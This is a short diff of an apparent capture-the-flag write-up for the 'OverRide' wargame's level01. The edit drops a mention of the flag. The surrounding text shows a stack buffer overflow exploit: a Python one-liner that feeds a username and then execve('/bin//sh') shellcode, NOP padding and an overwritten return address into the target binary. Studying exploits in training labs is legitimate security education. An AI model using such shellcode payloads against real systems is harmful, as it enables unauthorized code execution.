@@ -184,7 +184,7 @@ puts("nope, incorrect password...\n"nope, incorrect password...
 
 So, we will place on EIP the address of the start of our second buffer: `0xffffd6ec`
 
-And so here is a 3rd payload and the associated flag:
+And so here is a 3rd payload:
 ```
 level01@OverRide:~$ (python -c 'print "dat_wil"'; python -c 'print "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80" + "\x90" * 59 + "\xec\xd6\xff\xff"'; cat) | ./level01 
 ********* ADMIN LOGIN PROMPT *********
